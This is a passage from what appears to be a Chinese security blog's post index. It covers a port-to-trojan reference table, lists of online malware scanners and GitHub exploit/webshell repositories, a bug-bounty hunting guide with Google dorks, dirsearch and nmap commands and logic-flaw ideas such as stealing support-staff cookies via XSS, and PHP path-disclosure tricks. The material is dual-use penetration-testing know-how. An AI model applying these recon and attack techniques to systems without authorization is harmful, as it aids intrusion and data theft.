Trojan开放1234、6776端口。木马SubSeven1.0/1.9开放1243、6711、6776端口。 </p><p>端口：1245<br>服务：[NULL]<br>说明：木马Vodoo开放此端口。 </p><p>端口：1433<br>服务：SQL<br>说明：Microsoft的SQL服务开放的端口。 </p><p>端口：1492<br>服务：stone-design-1<br>说明：木马FTP99CMP开放此端口。 </p><p>端口：1500<br>服务：RPC client fixed port session queries<br>说明：RPC客户固定端口会话查询 </p><p>端口：1503<br>服务：NetMeeting T.120<br>说明：NetMeeting T.120 </p><p>端口：1524<br>服务：ingress<br>说明：许多攻击脚本将安装一个后门SHELL于这个端口，尤其是针对SUN系统中Sendmail和RPC服务漏洞的脚本。如果刚安装了防火墙就看到在这个端口上的连接企图，很可能是上述原因。可以试试Telnet到用户的计算机上的这个端口，看看它是否会给你一个SHELL。连接到600/pcserver也存在这个问题。 </p><p>端口：1600<br>服务：issd<br>说明：木马Shivka-Burka开放此端口。 </p><p>端口：1720<br>服务：NetMeeting<br>说明：NetMeeting H.233 call Setup。 </p><p>端口：1731<br>服务：NetMeeting Audio Call Control<br>说明：NetMeeting音频调用控制。 </p><p>端口：1807<br>服务：[NULL]<br>说明：木马SpySender开放此端口。 </p><p>端口：1981<br>服务：[NULL]<br>说明：木马ShockRave开放此端口。 </p><p>端口：1999<br>服务：cisco identification port<br>说明：木马BackDoor开放此端口。 </p><p>端口：2000<br>服务：[NULL]<br>说明：木马GirlFriend 1.3、Millenium 1.0开放此端口。 </p><p>端口：2001<br>服务：[NULL]<br>说明：木马Millenium 1.0、Trojan Cow开放此端口。 </p><p>端口：2023<br>服务：xinuexpansion 4<br>说明：木马Pass Ripper开放此端口。 </p><p>端口：2049<br>服务：NFS<br>说明：NFS程序常运行于这个端口。通常需要访问Portmapper查询这个服务运行于哪个端口。 </p><p>端口：2115<br>服务：[NULL]<br>说明：木马Bugs开放此端口。 </p><p>端口：2140、3150<br>服务：[NULL]<br>说明：木马Deep Throat 1.0/3.0开放此端口。 </p><p>端口：2500<br>服务：RPC client using a fixed port session replication<br>说明：应用固定端口会话复制的RPC客户 </p><p>端口：2583<br>服务：[NULL]<br>说明：木马Wincrash 2.0开放此端口。 </p><p>端口：2801<br>服务：[NULL]<br>说明：木马Phineas Phucker开放此端口。 </p><p>端口：3024、4092<br>服务：[NULL]<br>说明：木马WinCrash开放此端口。 </p><p>端口：3128<br>服务：squid<br>说明：这是squid HTTP代理服务器的默认端口。攻击者扫描这个端口是为了搜寻一个代理服务器而匿名访问Internet。也会看到搜索其他代理服务器的端口8000、8001、8080、8888。扫描这个端口的另一个原因是用户正在进入聊天室。其他用户也会检验这个端口以确定用户的机器是否支持代理。 </p><p>端口：3129<br>服务：[NULL]<br>说明：木马Master Paradise开放此端口。 </p><p>端口：3150<br>服务：[NULL]<br>说明：木马The Invasor开放此端口。 </p><p>端口：3210、4321<br>服务：[NULL]<br>说明：木马SchoolBus开放此端口 </p><p>端口：3333<br>服务：dec-notes<br>说明：木马Prosiak开放此端口 </p><p>端口：3389<br>服务：超级终端<br>说明：WINDOWS 2000终端开放此端口。 </p><p>端口：3700<br>服务：[NULL]<br>说明：木马Portal of Doom开放此端口 </p><p>端口：3996、4060<br>服务：[NULL]<br>说明：木马RemoteAnything开放此端口 </p><p>端口：4000<br>服务：QQ客户端<br>说明：腾讯QQ客户端开放此端口。 </p><p>端口：4092<br>服务：[NULL]<br>说明：木马WinCrash开放此端口。 </p><p>端口：4590<br>服务：[NULL]<br>说明：木马ICQTrojan开放此端口。 </p><p>端口：5000、5001、5321、50505<br>服务：[NULL]<br>说明：木马blazer5开放5000端口。木马Sockets de Troie开放5000、5001、5321、50505端口。 </p><p>端口：5400、5401、5402<br>服务：[NULL]<br>说明：木马Blade Runner开放此端口。 </p><p>端口：5550<br>服务：[NULL]<br>说明：木马xtcp开放此端口。 </p><p>端口：5569<br>服务：[NULL]<br>说明：木马Robo-Hack开放此端口。 </p><p>端口：5632<br>服务：pcAnywere<br>说明：有时会看到很多这个端口的扫描，这依赖于用户所在的位置。当用户打开pcAnywere时，它会自动扫描局域网C类网以寻找可能的代理（这里的代理是指agent而不是proxy）。入侵者也会寻找开放这种服务的计算机。，所以应该查看这种扫描的源地址。一些搜寻pcAnywere的扫描包常含端口22的UDP数据包。 </p><p>端口：5742<br>服务：[NULL]<br>说明：木马WinCrash1.03开放此端口。 </p><p>端口：6267<br>服务：[NULL]<br>说明：木马广外女生开放此端口。 </p><p>端口：6400<br>服务：[NULL]<br>说明：木马The tHing开放此端口。 </p><p>端口：6670、6671<br>服务：[NULL]<br>说明：木马Deep Throat开放6670端口。而Deep Throat 3.0开放6671端口。 </p><p>端口：6883<br>服务：[NULL]<br>说明：木马DeltaSource开放此端口。 </p><p>端口：6969<br>服务：[NULL]<br>说明：木马Gatecrasher、Priority开放此端口。 </p><p>端口：6970<br>服务：RealAudio<br>说明：RealAudio客户将从服务器的6970-7170的UDP端口接收音频数据流。这是由TCP-7070端口外向控制连接设置的。 </p><p>端口：7000<br>服务：[NULL]<br>说明：木马Remote Grab开放此端口。 </p><p>端口：7300、7301、7306、7307、7308<br>服务：[NULL]<br>说明：木马NetMonitor开放此端口。另外NetSpy1.0也开放7306端口。 </p><p>端口：7323<br>服务：[NULL]<br>说明：Sygate服务器端。 </p><p>端口：7626<br>服务：[NULL]<br>说明：木马Giscier开放此端口。 </p><p>端口：7789<br>服务：[NULL]<br>说明：木马ICKiller开放此端口。 </p><p>端口：8000<br>服务：OICQ<br>说明：腾讯QQ服务器端开放此端口。 </p><p>端口：8010<br>服务：Wingate<br>说明：Wingate代理开放此端口。 </p><p>端口：8080<br>服务：代理端口<br>说明：WWW代理开放此端口。 </p><p>端口：9400、9401、9402<br>服务：[NULL]<br>说明：木马Incommand 1.0开放此端口。 </p><p>端口：9872、9873、9874、9875、10067、10167<br>服务：[NULL]<br>说明：木马Portal of Doom开放此端口。 </p><p>端口：9989<br>服务：[NULL]<br>说明：木马iNi-Killer开放此端口。 </p><p>端口：11000<br>服务：[NULL]<br>说明：木马SennaSpy开放此端口。 </p><p>端口：11223<br>服务：[NULL]<br>说明：木马Progenic trojan开放此端口。 </p><p>端口：12076、61466<br>服务：[NULL]<br>说明：木马Telecommando开放此端口。 </p><p>端口：12223<br>服务：[NULL]<br>说明：木马Hack’99 KeyLogger开放此端口。 </p><p>端口：12345、12346<br>服务：[NULL]<br>说明：木马NetBus1.60/1.70、GabanBus开放此端口。 </p><p>端口：12361<br>服务：[NULL]<br>说明：木马Whack-a-mole开放此端口。 </p><p>端口：13223<br>服务：PowWow<br>说明：PowWow是Tribal Voice的聊天程序。它允许用户在此端口打开私人聊天的连接。这一程序对于建立连接非常具有攻击性。它会驻扎在这个TCP端口等回应。造成类似心跳间隔的连接请求。如果一个拨号用户从另一个聊天者手中继承了IP地址就会发生好象有很多不同的人在测试这个端口的情况。这一协议使用OPNG作为其连接请求的前4个字节。 </p><p>端口：16969<br>服务：[NULL]<br>说明：木马Priority开放此端口。 </p><p>端口：17027<br>服务：Conducent<br>说明：这是一个外向连接。这是由于公司内部有人安装了带有Conducentadbot的共享软件。Conducentadbot是为共享软件显示广告服务的。使用这种服务的一种流行的软件是Pkware。 </p><p>端口：19191<br>服务：[NULL]<br>说明：木马蓝色火焰开放此端口。 </p><p>端口：20000、20001<br>服务：[NULL]<br>说明：木马Millennium开放此端口。 </p><p>端口：20034<br>服务：[NULL]<br>说明：木马NetBus Pro开放此端口。 </p><p>端口：21554<br>服务：[NULL]<br>说明：木马GirlFriend开放此端口。 </p><p>端口：22222<br>服务：[NULL]<br>说明：木马Prosiak开放此端口。 </p><p>端口：23456<br>服务：[NULL]<br>说明：木马Evil FTP、Ugly FTP开放此端口。 </p><p>端口：26274、47262<br>服务：[NULL]<br>说明：木马Delta开放此端口。 </p><p>端口：27374<br>服务：[NULL]<br>说明：木马Subseven 2.1开放此端口。 </p><p>端口：30100<br>服务：[NULL]<br>说明：木马NetSphere开放此端口。 </p><p>端口：30303<br>服务：[NULL]<br>说明：木马Socket23开放此端口。 </p><p>端口：30999<br>服务：[NULL]<br>说明：木马Kuang开放此端口。 </p><p>端口：31337、31338<br>服务：[NULL]<br>说明：木马BO(Back Orifice)开放此端口。另外木马DeepBO也开放31338端口。 </p><p>端口：31339<br>服务：[NULL]<br>说明：木马NetSpy DK开放此端口。 </p><p>端口：31666<br>服务：[NULL]<br>说明：木马BOWhack开放此端口。 </p><p>端口：33333<br>服务：[NULL]<br>说明：木马Prosiak开放此端口。 </p><p>端口：34324<br>服务：[NULL]<br>说明：木马Tiny Telnet Server、BigGluck、TN开放此端口。 </p><p>端口：40412<br>服务：[NULL]<br>说明：木马The Spy开放此端口。 </p><p>端口：40421、40422、40423、40426、<br>服务：[NULL]<br>说明：木马Masters Paradise开放此端口。 </p><p>端口：43210、54321<br>服务：[NULL]<br>说明：木马SchoolBus 1.0/2.0开放此端口。 </p><p>端口：44445<br>服务：[NULL]<br>说明：木马Happypig开放此端口。 </p><p>端口：50766<br>服务：[NULL]<br>说明：木马Fore开放此端口。 </p><p>端口：53001<br>服务：[NULL]<br>说明：木马Remote Windows Shutdown开放此端口。 </p><p>端口：65000<br>服务：[NULL]<br>说明：木马Devil 1.03开放此端口。 </p><p>端口：88<br>说明：Kerberos krb5。另外TCP的88端口也是这个用途。 </p><p>端口：137<br>说明：SQL Named Pipes encryption over other protocols name lookup(其他协议名称查找上的SQL命名管道加密技术)和SQL RPC encryption over other protocols name lookup(其他协议名称查找上的SQL RPC加密技术)和Wins NetBT name service(WINS NetBT名称服务)和Wins Proxy都用这个端口。 </p><p>端口：161<br>说明：Simple Network Management Protocol(SMTP)（简单网络管理协议）。 </p><p>端口：162<br>说明：SNMP Trap（SNMP陷阱） </p><p>端口：445<br>说明：Common Internet File System(CIFS)（公共Internet文件系统） </p><p>端口：464<br>说明：Kerberos kpasswd(v5)。另外TCP的464端口也是这个用途。 </p><p>端口：500<br>说明：Internet Key Exchange(IKE)（Internet密钥交换） </p><p>端口：1645、1812<br>说明：Remot Authentication Dial-In User Service(RADIUS)authentication(Routing and Remote Access)(远程认证拨号用户服务) </p><p>端口：1646、1813<br>说明：RADIUS accounting(Routing and Remote Access)(RADIUS记帐（路由和远程访问）) </p><p>端口：1701<br>说明：Layer Two Tunneling Protocol(L2TP)(第2层隧道协议) </p><p>端口：1801、3527<br>说明：Microsoft Message Queue Server(Microsoft消息队列服务器)。还有TCP的135、1801、2101、2103、2105也是同样的用途。 </p><p>端口：2504<br>说明：Network Load Balancing(网络平衡负荷) </p>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 各种端口 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网站/APP/Webshell在线查毒地址</title>
      <link href="/2021/09/26/%E7%BD%91%E7%AB%99-APP-Webshell%E5%9C%A8%E7%BA%BF%E6%9F%A5%E6%AF%92%E5%9C%B0%E5%9D%80/"/>
      <url>/2021/09/26/%E7%BD%91%E7%AB%99-APP-Webshell%E5%9C%A8%E7%BA%BF%E6%9F%A5%E6%AF%92%E5%9C%B0%E5%9D%80/</url>
      
        <content type="html"><![CDATA[<h2 id="PC电脑软件在线查毒"><a href="#PC电脑软件在线查毒" class="headerlink" title="PC电脑软件在线查毒"></a>PC电脑软件在线查毒</h2><p><strong>腾讯哈勃分析系统</strong>：<a href="https://habo.qq.com/">https://habo.qq.com/</a></p><p>普通用户上传单文件不能超过30MB，使用上传必须登录</p><p><strong>VirSCAN.org</strong>：<a href="http://www.virscan.org/">http://www.virscan.org/</a></p><p>国外老牌在线扫描文件查毒网站，提供多个杀毒软件扫描功能，但限制上传单文件最大20MB。支持RAR或ZIP格式的自动解压缩，但压缩文件中不能包含超过20个文件。</p><p><strong>VirusTotal</strong>：<a href="https://www.virustotal.com/">https://www.virustotal.com/</a></p><p>也是国外老牌在线查毒网站，可惜以前有提供中文页面，但是现在没有了，只有英文页面。</p><p><strong>Metadefender Cloud</strong>：<a href="https://metadefender.opswat.com/">https://metadefender.opswat.com/</a></p><p>国外英文在线查毒网站，单文件最大140MB，除了上传文件，还可以对网站域名，哈希值，网页链接，IP等查毒。</p><p><strong>Jotti的恶意软件扫描系统</strong>：<a href="https://virusscan.jotti.org/">https://virusscan.jotti.org/</a></p><p>单文件最大250MB，一项免费服务，让您可以同时使用几个反病毒程序进行在线扫描可疑文件。</p><p><strong>魔盾安全分析</strong>：<a href="https://maldun.com/dashboard/">https://maldun.com/dashboard/</a></p><p>魔盾安全分析 (MALDUN.COM) 提供了一个免费的基于虚拟执行的恶意软件及网页链接分析平台。您可以在线上传需要分析的文件，或提交可疑的网页链接，魔盾安全分析会在虚拟环境中执行这个文件或打开链接，并对各种恶意软件行为特征进行监控和评分，从而帮助您了解该文件或链接是否隐藏了恶意代码，以及是否会对您的电脑造成危害。(支持大部分Windows文件分析，安卓APK文件分析)</p><p><strong>ANY.RUN</strong>：<a href="https://any.run/">https://any.run/</a></p><p>国外英文站，Any.Run与其他沙盒分析工具的主要区别在于，Any.Run是完全交互式的。这意味着使用Any.Run你可以上传文件，并在分析文件的同时与沙箱实时交互，而不是传统的上传文件然后等待报告。除此之外的另一大好处就是，Any.Run允许你上传需要点击按钮，启用内容或宏的恶意文档程序。</p><p><strong>ScanVir云鉴定网</strong>：<a href="http://www.scanvir.com/">http://www.scanvir.com/</a></p><p>一个免费网站，针对计算机病毒、手机病毒、可疑文件等进行检测和分析。单文件最大3MB</p><h2 id="手机APP在线查毒"><a href="#手机APP在线查毒" class="headerlink" title="手机APP在线查毒"></a>手机APP在线查毒</h2><p><strong>百度移动安全检测</strong>：<a href="http://scan.safe.baidu.com/">http://scan.safe.baidu.com</a></p><p>Android应用软件包在线查毒（APK文件格式，小于100MB）</p><p><strong>腾讯移动安全实验室</strong>：<a href="https://m.qq.com/security_lab/scans_online.jsp">https://m.qq.com/security_lab/scans_online.jsp</a></p><p>支持格式：sisx\sis\apk\jar</p><p><strong>西安交通大学sanddroid</strong>：<a href="http://sanddroid.xjtu.edu.cn/#upload">http://sanddroid.xjtu.edu.cn/#upload</a></p><p>一个自动的Android应用程序分析系统。</p><p><strong>腾讯金刚审计系统</strong>：<a href="https://service.security.tencent.com/kingkong">https://service.security.tencent.com/kingkong</a></p><h2 id="Webshell在线查毒"><a href="#Webshell在线查毒" class="headerlink" title="Webshell在线查毒"></a>Webshell在线查毒</h2><p><strong>百度WEBDIR+：</strong><a href="https://scanner.baidu.com/">https://scanner.baidu.com/</a></p><p>在线查杀木马，免费开放API支持批量检测。</p><p><strong>河马</strong>：<a href="https://n.shellpub.com/">https://n.shellpub.com</a></p><p>支持Windows、linux，支持在线查杀。拥有海量webshell样本和自主查杀技术，采用传统特征+云端大数据双引擎的查杀技术。单文件最大支持20MB</p><p><strong>在线webshell查杀</strong>：<a href="http://tools.bugscaner.com/killwebshell/">http://tools.bugscaner.com/killwebshell/</a></p><p>允许上传文件最大2MB</p>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 查毒 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>POC-漏洞-Github地址</title>
      <link href="/2021/09/24/POC-%E6%BC%8F%E6%B4%9E-Github%E5%9C%B0%E5%9D%80/"/>
      <url>/2021/09/24/POC-%E6%BC%8F%E6%B4%9E-Github%E5%9C%B0%E5%9D%80/</url>
      
        <content type="html"><![CDATA[<p>个人常用的POC-GitHub项目地址</p><h2 id="CVE、CMS、中间件漏洞检测利用合集"><a href="#CVE、CMS、中间件漏洞检测利用合集" class="headerlink" title="CVE、CMS、中间件漏洞检测利用合集"></a>CVE、CMS、中间件漏洞检测利用合集</h2><p><a href="https://github.com/lovechinacoco/https-github.com-mai-lang-chai-Middleware-Vulnerability-detection">https://github.com/lovechinacoco/https-github.com-mai-lang-chai-Middleware-Vulnerability-detection</a></p><h2 id="POC-amp-EXP仓库、hvv弹药库、Nday、1day"><a href="#POC-amp-EXP仓库、hvv弹药库、Nday、1day" class="headerlink" title="POC&amp;EXP仓库、hvv弹药库、Nday、1day"></a>POC&amp;EXP仓库、hvv弹药库、Nday、1day</h2><p><a href="https://github.com/DawnFlame/POChouse">https://github.com/DawnFlame/POChouse</a></p><h2 id="PeiQi-WIKI-POC"><a href="#PeiQi-WIKI-POC" class="headerlink" title="PeiQi-WIKI-POC"></a>PeiQi-WIKI-POC</h2><p><a href="https://github.com/PeiQi0/PeiQi-WIKI-POC">https://github.com/PeiQi0/PeiQi-WIKI-POC</a></p><blockquote><p>本地查看： 启动phpstudy，<a href="http://127.0.0.1/book/">http://127.0.0.1/book/</a></p></blockquote><h2 id="各种漏洞PoC、ExP的收集或编写"><a href="#各种漏洞PoC、ExP的收集或编写" class="headerlink" title="各种漏洞PoC、ExP的收集或编写"></a>各种漏洞PoC、ExP的收集或编写</h2><p><a href="https://github.com/coffeehb/Some-PoC-oR-ExP">https://github.com/coffeehb/Some-PoC-oR-ExP</a></p><h2 id="2020一些漏洞"><a href="#2020一些漏洞" class="headerlink" title="2020一些漏洞"></a>2020一些漏洞</h2><p><a href="https://github.com/r0eXpeR/CVE-2020">https://github.com/r0eXpeR/CVE-2020</a></p><h2 id="一些最新漏洞"><a href="#一些最新漏洞" class="headerlink" title="一些最新漏洞"></a>一些最新漏洞</h2><p><a href="https://github.com/EdgeSecurityTeam/Vulnerability">https://github.com/EdgeSecurityTeam/Vulnerability</a></p><h2 id="thinkphp-v5-x-远程代码执行漏洞-POC集合"><a href="#thinkphp-v5-x-远程代码执行漏洞-POC集合" class="headerlink" title="thinkphp v5.x 远程代码执行漏洞-POC集合"></a>thinkphp v5.x 远程代码执行漏洞-POC集合</h2><p><a href="https://github.com/SkyBlueEternal/thinkphp-RCE-POC-Collection">https://github.com/SkyBlueEternal/thinkphp-RCE-POC-Collection</a></p><h2 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h2><p><a href="https://github.com/tennc/webshell">https://github.com/tennc/webshell</a></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞 </tag>
            
            <tag> POC </tag>
            
            <tag> 资源 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SRC挖掘经验</title>
      <link href="/2021/09/24/SRC%E6%8C%96%E6%8E%98%E7%BB%8F%E9%AA%8C/"/>
      <url>/2021/09/24/SRC%E6%8C%96%E6%8E%98%E7%BB%8F%E9%AA%8C/</url>
      
        <content type="html"><![CDATA[<p>SRC漏洞挖掘经验+技巧篇</p><h2 id="漏洞挖掘的前期–信息收集"><a href="#漏洞挖掘的前期–信息收集" class="headerlink" title="漏洞挖掘的前期–信息收集"></a>漏洞挖掘的前期–信息收集</h2><h3 id="域名信息收集"><a href="#域名信息收集" class="headerlink" title="域名信息收集"></a>域名信息收集</h3><p>src一般都只收对应的漏洞，很多src的公告里面就会明确范围；然后我们就需要根据这些范围来确定域名。</p><p>如果src上面没有给出范围，那么需要我们去搜集，你需要知道哪些domain是该公司的，主要通过手工来查看：</p><ul><li>网站的关于页面／网站地图</li><li>whois反查</li><li>一些网站里面的跳转请求（也可以关注一下app）</li><li>还有就是百度，有些会在title 和 copyright信息里面出现该公司的信息</li><li>网站html源码：主要就是一些图片、js、css等，也会出现一些域名</li><li>apk反编译源码里面</li></ul><h3 id="子域名信息收集"><a href="#子域名信息收集" class="headerlink" title="子域名信息收集"></a>子域名信息收集</h3><p>工具：</p><ul><li><p>subdomain lijiejie的子域名收集工具（个人觉得挺好用的）；</p></li><li><p>layer：这个工具也不错；</p></li><li><p>oneforall</p><blockquote><p>对收集到到域名进行指纹探测，查询是否有Nday</p><p>工具：Ehole、Glass</p></blockquote></li></ul><p>但是只要是工具就会有误报，建议大家对获取的子域名写个脚本处理一下；判断哪些是可以访问的，哪些是不可以访问的，哪些访问是测试页面的。可以节约不少时间。</p><p>利用google hacking 搜索，大家一定不要只用google 搜索，这样是不全面的，还有 bing（不用翻墙）、百度、360等等，因为很多国内的网站利用google去搜索是搜不到的。这里就不说语法了，贴几条常用的就行了</p><blockquote><p>搜集敏感文件：site:xxx.com filetype:doc</p><p>搜集管理后台：site:xxx.com 管理／site:xxx.com admin／site:xxx.com login</p><p>搜集mail：site:xxx.com intext:@xxx.com／intext:@xxx.com</p><p>搜集敏感web路径：site:xxx.com intitle:登录／site:xxx.com inurl:sql.php</p></blockquote><h3 id="敏感信息收集"><a href="#敏感信息收集" class="headerlink" title="敏感信息收集"></a>敏感信息收集</h3><p>这一块是比较大的一块，我这里举一些：</p><ul><li><p>github源代码：网上有工具（<a href="https://github.com/repoog/GitPrey%EF%BC%89">https://github.com/repoog/GitPrey）</a></p></li><li><p>svn信息泄漏：这个只能用扫描器了</p></li><li><p>敏感文件：比如数据库配置文件啦（有案例的）、网站源码啊、数据库备份文件等等</p></li><li><p>敏感目录：网站后台目录／一些登录地址／一些接口目录</p><blockquote><p>dirsearch</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python3 dirsearch.py -u www.xxx.com -e * -t <span class="token number">2</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>线程数-t设置小一点</p></blockquote></li><li><p>JS信息收集</p><blockquote><p>JSFinder、各种js文件寻找隐藏接口</p></blockquote></li><li><p>email：邮箱命名规则、公司是否具有邮箱默认密码（这个可以采取社工，毕竟我司默认密码就很弱鸡）。</p></li><li><p>员工号：很多oa、um、sso系统都是采用员工号登录的，所以知道员工号的规则很多时候能帮助我们进行撞库。</p></li><li><p>商家信息：如果是一些具有商家系统的，能收集到一些商家账户（自己搞去，可以注册，注册资料请百度）就可以进入很多系统来测试了。</p></li></ul><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> nmap -sS -Pn -n --open --min-hostgroup <span class="token number">4</span> --min-parallelism <span class="token number">1024</span> --host-timeout <span class="token number">30</span> -T4 -v  examples.com<span class="token function">sudo</span> nmap -sS -Pn -n --open --min-hostgroup <span class="token number">4</span> --min-parallelism <span class="token number">1024</span> --host-timeout <span class="token number">30</span> -T4 -v -p <span class="token number">1</span>-65535 examples.com<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="小结一下"><a href="#小结一下" class="headerlink" title="小结一下"></a>小结一下</h3><p>其实很多时候，我们通过信息收集能得到不少的漏洞了，我这里举几个简单的案例：</p><ul><li>通过搜索引擎获取系统管理页面，直接越权访问；</li><li>通过github直接找到管理后台账号密码；</li><li>通过目录／文件扫描直接得到系统信息（ip、管理员账号密码）连入服务器；</li><li>当然也有很多通过信息收集得到一些东西结合其他手段；</li></ul><h2 id="漏洞挖掘的中期–信息处理"><a href="#漏洞挖掘的中期–信息处理" class="headerlink" title="漏洞挖掘的中期–信息处理"></a>漏洞挖掘的中期–信息处理</h2><h3 id="信息整理"><a href="#信息整理" class="headerlink" title="信息整理"></a>信息整理</h3><p>对于收集到的信息，我们不能收集完了就完了，一定好好整理，会对后期渗透有很大的帮助</p><p>利用word或excel或txt 都行，我建议word 和excel，因为txt毕竟太简单了</p><p>分类：</p><ul><li>哪些网站功能类似；</li><li>哪些网站可能使用的同一模版；</li><li>哪些网站有waf（这个一般在url中标明就好）；</li><li>哪些网站能登录（注册的账号也一定要记住，最好可以准备两个手机号，两个邮箱方便注册）；</li><li>哪些网站暴露过哪些类型的漏洞（这个只能去乌云上面找）；</li><li>网站目前有哪些功能（这个稍微关注一下网站公告，看最近是否会有业务更迭）；</li></ul><h3 id="漏洞整理"><a href="#漏洞整理" class="headerlink" title="漏洞整理"></a>漏洞整理</h3><p>我们辛苦的挖洞一定要对我们挖掘出来的漏洞有一个记录，记录的可以稍微详细一些，一是可以方便自己以后回顾，还有就是以后说不定有些地方出现了跟以前一样的功能，这样就方便我们更快的找到漏洞。这里建议doc文档，图片可以贴的详细一些</p><p>第二个就是通过漏洞得到的一些数据：</p><ul><li>订单信息；遍历、注入</li><li>用户信息：这个可以通过撞库获取、任意密码重置获取、注入</li><li>数据库用户名密码：注入、配置泄漏</li></ul><p>为什么我们要整理这些数据，因为我们要根据这些数据来设计我们的字典</p><h2 id="漏洞挖掘的后期–漏洞挖掘"><a href="#漏洞挖掘的后期–漏洞挖掘" class="headerlink" title="漏洞挖掘的后期–漏洞挖掘"></a>漏洞挖掘的后期–漏洞挖掘</h2><p>毕竟漏洞的类型就那么些，像前文说过就是owasp top 10、逻辑，对于挖掘这些漏洞，我觉得没什么特别好的办法，就是抓包分析逻辑（这里说的不包括对软件客户端的挖掘、app的挖掘）</p><p>首先我们需要对一个网站／app有一个了解要知道它的功能点有哪些</p><p>其次我们要分析这个网站／app里面的请求哪些是我们可以控制的参数，这些地方就是漏洞经常出没的点</p><p>最后就是分析逻辑，这一类别的漏洞主要还是涉及一套流程，这里举个例子：</p><blockquote><p> 买东西</p><ul><li>首先我们要选择：</li></ul><ol><li>筛选涉及查询（是否可以SQL注入）</li><li>加入购物车：商品数量是否可以为负</li></ol><ul><li>询问商家：</li></ul><ol><li>跳转客服系统，跳转url中是否含有用户参数</li><li>xss打客服cookie</li><li>钓鱼+社工</li></ol><ul><li>下单：</li></ul><ol><li>填地址，涉及插入（注入）、xss</li><li>修改单价</li><li>修改总额（这里说明一下修改总额：情况1，就是我们可能会遇到可以使用优惠卷的情况，比如我们买了100的东西只能使用5块的优惠价，但是我有一张50的优惠卷是否可以使用；情况2，打折我们是否可以修改打折的折扣；情况3，我们是否可以修改运费，将运费改为负数；情况n）</li><li>备注：xss，sql注入</li></ol><ul><li>电子票据：</li></ul><ol><li>会写抬头</li></ol><ul><li>支付：</li></ul><ol><li>传输过程中是否可以修改，如果是扫描二维码支付，我们可以分析一下二维码中的请求url看是否可以修改以后重新生成二维码（这里不讨论具体的支付了，因为微信和支付宝都很安全）</li></ol><ul><li>订单完成：</li></ul><ol><li>是否可以遍历订单</li></ol><ul><li>评价：</li></ul><ol><li>注入、上传图片、xss</li></ol><ul><li>退货..</li></ul><p>大家可以无限延伸，这里只是抛砖引玉。</p></blockquote><p>建议：</p><p>src慢慢的挖多了系统更新不快，业务不多自然就很难挖了，所以一定要有坚持精神，深入挖掘意识，因为挖洞没有想象中的那么简单；不要想一步登天，多去看看一些案例分析一下别人的挖掘思路，然后跟着学。</p><h2 id="挖洞小技巧"><a href="#挖洞小技巧" class="headerlink" title="挖洞小技巧"></a>挖洞小技巧</h2><p>敢于怀疑漏洞的存在，然后再去验证它</p><p>从开发设计的角度去看，想开发所想</p><p>了解业务和情报收集</p><p>坚持和努力就会有所回报</p><p>多看师傅们的文章，学会师傅们的骚操作和思路</p><p>运气也很重要，但是努力的人运气一般不会太差哦</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 挖洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php爆路径</title>
      <link href="/2021/09/23/php%E7%88%86%E8%B7%AF%E5%BE%84/"/>
      <url>/2021/09/23/php%E7%88%86%E8%B7%AF%E5%BE%84/</url>
      
        <content type="html"><![CDATA[<p>PHP爆路径的一些方法</p><h2 id="单引号爆路径"><a href="#单引号爆路径" class="headerlink" title="单引号爆路径"></a>单引号爆路径</h2><p>直接在URL后面加单引号，要求单引号没有被过滤(gpc=off)且服务器默认返回错误信息<br><a href="http://www.xxx.com/news.php?id=149%E2%80%B2">www.xxx.com/news.php?id=149′</a></p><h2 id="错误参数值爆路径"><a href="#错误参数值爆路径" class="headerlink" title="错误参数值爆路径"></a>错误参数值爆路径</h2><p>将要提交的参数值改成错误值，比如-1。-99999单引号被过滤时不妨试试<br><a href="http://www.xxx.com/researcharchive.php?id=-1">www.xxx.com/researcharchive.php?id=-1</a></p><h2 id="Google爆路径"><a href="#Google爆路径" class="headerlink" title="Google爆路径"></a>Google爆路径</h2><p>结合关键字和site语法搜索出错页面的网页快照，常见关键字有warning和fatal error。注意，如果目标站点是二级域名，site接的是其对应的顶级域名，这样得到的信息要多得多<br>Site:xxx.edu.tw warning<br>Site:xxx.com.tw “fatal error”</p><h2 id="测试文件爆路径"><a href="#测试文件爆路径" class="headerlink" title="测试文件爆路径"></a>测试文件爆路径</h2><p>很多网站的根目录下都存在测试文件，脚本代码通常都是phpinfo()。<br><a href="http://www.xxx.com/test.php">www.xxx.com/test.php</a><br><a href="http://www.xxx.com/ceshi.php">www.xxx.com/ceshi.php</a><br><a href="http://www.xxx.com/info.php">www.xxx.com/info.php</a><br><a href="http://www.xxx.com/phpinfo.php">www.xxx.com/phpinfo.php</a><br><a href="http://www.xxx.com/php_info.php">www.xxx.com/php_info.php</a><br><a href="http://www.xxx.com/1.php">www.xxx.com/1.php</a></p><h2 id="phpmyadmin爆路径"><a href="#phpmyadmin爆路径" class="headerlink" title="phpmyadmin爆路径"></a>phpmyadmin爆路径</h2><p>一旦找到phpmyadmin的管理页面，再访问该目录下的某些特定文件，就很有可能爆出物理路径。至于phpmyadmin的地址可以用wwwscan这类的工具去扫，也可以选择google。PS：有些BT网站会写成phpMyAdmin</p><ol><li>/phpmyadmin/libraries/lect_lang.lib.php</li><li>/phpMyAdmin/index.php?lang[]=1</li><li>/phpMyAdmin/phpinfo.php</li><li>load_file()</li><li>/phpmyadmin/themes/darkblue_orange/layout.inc.php</li><li>/phpmyadmin/libraries/select_lang.lib.php</li><li>/phpmyadmin/libraries/lect_lang.lib.php</li><li>/phpmyadmin/libraries/mcrypt.lib.php </li></ol>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
